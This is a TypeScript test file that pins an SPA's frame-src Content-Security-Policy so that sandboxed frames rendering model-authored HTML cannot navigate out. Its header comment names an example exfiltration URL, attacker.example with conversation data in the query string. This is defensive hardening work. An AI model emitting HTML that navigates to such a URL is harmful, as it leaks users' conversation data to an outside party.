/**
 * Guard for the SPA's `frame-src` CSP meta (ATL-1197).
 *
 * The sandboxed srcdoc surfaces render model-authored HTML, and the only
 * thing that stops such a document from navigating ITSELF to
 * `https://attacker.example/?d=<conversation data>` is the embedding page's
 * `frame-src` — no CSP inside the frame can express a navigation restriction
 * (`navigate-to` was never shipped). These assertions pin the properties that
 * make the directive effective rather than the exact string, so widening the
 * allowlist deliberately doesn't churn this file.
 */
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "bun:test";

const INDEX_HTML = readFileSync(
  join(import.meta.dir, "..", "..", "index.html"),
  "utf-8",
);

describe("index.html frame-src CSP", () => {
  it("declares a CSP meta with frame-src exactly once", () => {
    const metas = INDEX_HTML.match(
      /http-equiv="Content-Security-Policy"/g,
    ) ?? [];
    expect(metas).toHaveLength(1);
    const content = /Content-Security-Policy"\s*content="([^"]*)"/.exec(
      INDEX_HTML,
    )?.[1];
    expect(content).toBeDefined();
    // Two declarations of the same directive within one policy would make
    // the second one dead (browsers honor only the first) — exactly how a
    // silent loosening slips in.
    expect(content!.match(/frame-src/g)).toHaveLength(1);
  });

  it("keeps 'self' as the floor so srcdoc frames work and nothing else does", () => {
    const content = /Content-Security-Policy"\s*content="([^"]*)"/.exec(
      INDEX_HTML,
    )?.[1];
    expect(content).toBeDefined();
    expect(content).toContain("frame-src 'self'");
    // No wildcard sources: `*` or `https:` would re-open the navigation
    // egress this directive exists to close.
    expect(content).not.toMatch(/frame-src[^;]*\s\*(\s|$|;)/);
    expect(content).not.toMatch(/frame-src[^;]*\shttps:(\s|$|;)/);
  });

  it("declares only frame-src — a full SPA policy is its own rollout", () => {
    const content = /Content-Security-Policy"\s*content="([^"]*)"/.exec(
      INDEX_HTML,
    )?.[1];
    expect(content).toBeDefined();
    // Any other directive added here starts blocking things (fonts, Sentry,
    // websockets) that this meta makes no claim about; it belongs in a
    // report-only rollout, not appended to the frame-src fix.
    const directives = content!
      .split(";")
      .map((d) => d.trim())
      .filter(Boolean);
    expect(directives).toHaveLength(1);
    expect(directives[0]!.startsWith("frame-src ")).toBe(true);
  });
});
